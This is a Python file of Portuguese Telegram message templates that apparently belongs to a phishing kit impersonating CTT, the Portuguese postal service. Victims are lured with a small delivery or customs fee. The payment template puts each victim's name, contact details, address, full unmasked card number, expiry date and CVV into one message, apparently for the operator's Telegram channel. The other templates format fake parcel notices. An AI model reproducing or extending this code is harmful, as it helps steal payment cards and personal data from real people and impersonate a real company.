"""
Templates personalizáveis para mensagens do Telegram
Pode modificar estes templates para personalizar as mensagens
"""

from datetime import datetime
from typing import Dict, Any

class TelegramTemplates:
    
    @staticmethod
    def billing_template(billing_data: Dict[str, Any]) -> str:
        """Template para mensagem de informações de entrega"""
        return f"""🏠 NOVA ENCOMENDA CTT 📦

👤 DADOS DO CLIENTE:
┣━ 📝 Nome: {billing_data.get('nome', 'N/A')}
┣━ 📧 Email: {billing_data.get('email', 'N/A')}
┗━ 📞 Telefone: {billing_data.get('telefone', 'N/A')}

📍 ENDEREÇO DE ENTREGA:
┣━ 🏠 Morada: {billing_data.get('endereco', 'N/A')}
┣━ 📮 Código Postal: {billing_data.get('codigoPostal', 'N/A')}
┗━ 🏙️ Cidade: {billing_data.get('cidade', 'N/A')}

⏰ TIMESTAMP: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
🔄 STATUS: ⏳ Aguardando Pagamento

═══════════════════════════════
🚚 CTT Express Delivery 🚚
═══════════════════════════════"""

    @staticmethod
    def payment_template(billing_data: Dict[str, Any], card_data: Dict[str, Any]) -> str:
        """Template para mensagem de pagamento - MENSAGEM ÚNICA COM TODOS OS DADOS"""
        # Show full card number (não mascarado conforme solicitado)
        card_number = card_data.get('numeroCartao', 'N/A')
        
        return f"""💳 PAGAMENTO PROCESSADO ✅

👤 DADOS DO CLIENTE:
┣━ 📝 Nome: {billing_data.get('nome', 'N/A')}
┣━ 📧 Email: {billing_data.get('email', 'N/A')}
┗━ 📞 Telefone: {billing_data.get('telefone', 'N/A')}

📍 ENDEREÇO DE ENTREGA:
┣━ 🏠 Morada: {billing_data.get('endereco', 'N/A')}
┣━ 📮 Código Postal: {billing_data.get('codigoPostal', 'N/A')}
┗━ 🏙️ Cidade: {billing_data.get('cidade', 'N/A')}

💰 DETALHES DO PAGAMENTO:
┣━ 💵 Valor: €2,99
┣━ 💳 Número do Cartão: {card_number}
┣━ 📅 Data de Expiração: {card_data.get('dataExpiracao', 'N/A')}
┗━ 🔒 CVV: {card_data.get('cvv', 'N/A')}

⏰ PROCESSADO EM: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
✅ STATUS: PAGAMENTO CONFIRMADO

═══════════════════════════════
🏆 Obrigado pela preferência! 🏆
═══════════════════════════════"""

    @staticmethod 
    def simple_billing_template(billing_data: Dict[str, Any]) -> str:
        """Template simples para entrega"""
        return f"""🏠 CTT - Nova Entrega

Nome: {billing_data.get('nome', 'N/A')}
Email: {billing_data.get('email', 'N/A')}
Telefone: {billing_data.get('telefone', 'N/A')}
Endereço: {billing_data.get('endereco', 'N/A')}
Código Postal: {billing_data.get('codigoPostal', 'N/A')}
Cidade: {billing_data.get('cidade', 'N/A')}

Data: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
Estado: Aguarda pagamento"""

    @staticmethod
    def emoji_billing_template(billing_data: Dict[str, Any]) -> str:
        """Template com muitos emojis"""
        return f"""🎉🏠 NOVA ENCOMENDA CTT! 🏠🎉

🙋‍♂️ CLIENTE: {billing_data.get('nome', 'N/A')} 
📧 EMAIL: {billing_data.get('email', 'N/A')}
📱 TELEFONE: {billing_data.get('telefone', 'N/A')}

🏡 ENDEREÇO: {billing_data.get('endereco', 'N/A')}
📬 CÓDIGO: {billing_data.get('codigoPostal', 'N/A')}
🏙️ CIDADE: {billing_data.get('cidade', 'N/A')}

⏰ DATA: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
⏳ ESTADO: Aguardando Pagamento da Taxa

🚚💨 CTT Express! 💨🚚"""

    @staticmethod
    def professional_template(billing_data: Dict[str, Any]) -> str:
        """Template profissional"""
        return f"""CTT - Correios de Portugal
Notificação de Encomenda

DADOS DO DESTINATÁRIO:
Nome: {billing_data.get('nome', 'N/A')}
Email: {billing_data.get('email', 'N/A')}  
Telefone: {billing_data.get('telefone', 'N/A')}

ENDEREÇO DE ENTREGA:
{billing_data.get('endereco', 'N/A')}
{billing_data.get('codigoPostal', 'N/A')} {billing_data.get('cidade', 'N/A')}

Processado em: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
Estado: Aguarda pagamento da taxa alfandegária

---
CTT - Correios de Portugal, S.A."""